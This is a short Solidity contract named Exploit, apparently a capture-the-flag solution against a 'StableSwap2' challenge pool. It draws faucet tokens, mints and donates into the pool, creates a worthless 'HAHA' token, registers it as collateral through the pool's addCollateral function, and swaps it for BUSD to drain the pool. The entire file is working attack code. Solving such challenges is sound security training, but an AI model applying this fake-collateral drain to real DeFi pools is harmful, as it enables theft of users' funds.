pragma solidity 0.8.0;

import "../console.sol";
import "./StableSwap2.sol";
import "./Setup.sol";
import {ERC20PresetFixedSupply} from "@openzeppelin/contracts/token/ERC20/presets/ERC20PresetFixedSupply.sol";

contract Exploit {
    StableSwap2 challenge;
    Setup setup;
    ERC20PresetFixedSupply public USDC;
    ERC20PresetFixedSupply public USDT;
    ERC20PresetFixedSupply public BUSD;
    ERC20PresetFixedSupply public HAHA;

    constructor(
        address _challenge,
        address _setup,
        address _usdc,
        address _usdt,
        address _busd
    ) {
        challenge = StableSwap2(_challenge);
        setup = Setup(_setup);
        USDC = ERC20PresetFixedSupply(_usdc);
        USDT = ERC20PresetFixedSupply(_usdt);
        BUSD = ERC20PresetFixedSupply(_busd);
    }

    function finalize() public {
        setup.faucet(10);
        USDC.approve(address(challenge), 10);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 10;
        amounts[1] = 0;
        amounts[2] = 0;
        challenge.mint(amounts);
        challenge.donate(10);
        HAHA = new ERC20PresetFixedSupply(
            "HAHA Stablecoin",
            "HAHA",
            100000000,
            address(this)
        );
        HAHA.approve(address(challenge), 100000);
        challenge.addCollateral(address(HAHA));
        challenge.swap(address(HAHA), 10000, address(BUSD));
    }
}
